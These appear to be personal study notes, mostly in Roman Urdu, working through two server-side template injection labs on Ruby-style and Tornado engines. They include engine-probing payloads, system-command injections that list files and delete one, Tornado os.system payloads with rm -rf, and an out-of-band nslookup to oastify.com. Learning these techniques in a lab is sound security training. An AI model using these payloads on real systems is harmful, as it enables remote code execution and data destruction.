Lab -> 1

Basic server-side template injection ->

1) View details me gya to msg likha aya url me bhe aya(Unfortunately this product is out of stock), to ab just dekhna yeh reflection hoye? yes hoye msg aya, then ham ne check krna kon sa template engine use ho rha, take hamein pata chale ke kon sa backend use kr rha, so ham us me he apna payload bhejein, wese to jo me ne seekha wo input field ka bataya tha ke input me kon sa use ho rha aap ne ye dekhna lakin yeh koi input hi tha yeh aik div tha and me ne us me $ $ lagaye us me payload kia intruder se, then response to sab 200 he aye ga lakin url kr ke dekha ke kis ka url me 49 nhi a rha, wese bhe kr kr ke dekh sakte, to ruby ka aya tha <%= 7 * 7 %> jo ke same node jesa he hai, us ke baad jo neeche system wale payloads likhe un ka use div ke andar yeh result a rha tha and del kr de file 

Payload	Engine Hint
{{7*7}}	Jinja2 (Python)
${7*7}	Velocity (Java)
<%= 7 * 7 %>	EJS / JSP (Node/Java)
[[7*7]]	AngularJS (Client-side)
{7*7}	Smarty (PHP)

<%= system("whoami") %> -> carlos true
<%= system("ls") %> -> morale.txt
true
<%= system("pwd") %> -> /home/carlos
true
<%= system("rm morale.txt") %>
in sab ko encode kr lena


Lab -> 2
Basic server-side template injection (code context) ->

Agenda ->
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Analysis -> 
LAB KA SCENE ME NE NIKALA URDU ME SAMJHA DETA PEHLE NEECHE PARH LENA KE KYA USE HO RHA AND TEMPLATE ENGINE HOTA KYA -> ACHA ME NE ACCOUNT ME LOGIN KIA AND US LOGIN ACCOUNT SE AIK POST KR DE JO KE NORMAL HAI AND POST PE MERA NAME LIKHA A RHA DONE BY WEINER PETER BUT MY ACCOUNT ME UPDATE KA OPT A RHA NAME KO, AB TEMPLATE ENGINE JO HOTE UN KA MATLAB HOTA Dynamic HTML banane ka tool TO ME NE WAHA CHANGE KIA NAME AND POST SE BHE CHANGE HO GYA YANI HTML PE SHOW HO RHA TO ME SAMJH GYA YAHA DYNAMIC CHEEZ USE HO RHY, BS YEH GAME HAI

Yeh tareka SSTI ka -> for every lab ->
1) check kuch nazar a rha user input ka reflection
2) enumerate kro payloads de ke 
3) agar error aya kuch gala tlikhne se to ssti ho ge
Basically is lab me us ne kaha hua ke tornado use kr rha engine lakin jis se lab seekh rha us ne is trha nikalwaya error nikalwa ke 

blog-post-author-display=user.first_namehbhbh&csrf=KYDzRv8z2gBSLwLXUqZNJW99wEKPR3Dn

user.first_name tha me ne yeh likha burp me-> user.first_namehbhbh


{{7*7}}
7*7
}}{{7*7}}{{
tino pe nhi chala abhi login kr ke me comment box me yeh kaam check kr rha cz main goal yeh he hai ke jaha jaha input ho rha template engine and kuch nazar a rha screen par waha ham try krein ge

Is sawal me hua yeh ke source kahin or tha and sink yani answer kahi or se mila, har input me try kia ke jis input ka result show ho rha kya wo 7*7 ko 49 krta ?? lakin agar name change wala jo tha waha agar name change kr dein burp suite se to wo 49 a jata

((os.system('whoami')}} -> yeh tab he show ho ga agar os import kia hua django me, warna a jaye ga not found, to esa he hua nhi chala error a gya and error me dikh bhe rha ke tornado use ho rha, and brackets  ke begair he dal ke check rkna yeh wala cz backend kuch esa ho ga {{ }} pehle se he brackets ho ge yah to brackets band kar ke dalo yah wese he, to ab kya karna ab ham import os krein ge, ab dekho jo me paylaod dene laga us se kaam ho ga to logo ne bana ke to rakhe lakin kabhi agar khud na mila to hamein khud dena pare ga kab tak ese krte rhy ge

{%import os%}{{os.system('nslookup oastify.com')}} -> lakin is ko ham begair brackets ke nhi kr sakte is ka structure kharab ho jaye ga u can c also
}}{%import os%}{{os.system('nslookup oastify.com')}}{{ -> To is trha band ho jaye ge purance bracket and new chale jaye ge, lakin us ko change kr lena }}{%import os%}{{os.system('rm -rf morale.txt')}}{{ -> Ese krna and ese encode kr dena 
Acha ab aik issue aya ke empty expresion allowed nhi  to 7*7}}{%import os%}{{os.system('rm -rf morale.txt')}}{{7*7 kr dena take jo dono expression close ho un me bhe koi value ho and lab is solved

To yeh sab hua post kr ke name change kia and name change wha pe reflect hua burp se udhr 7*7 likha jaha user,name esa kuch likha tha 

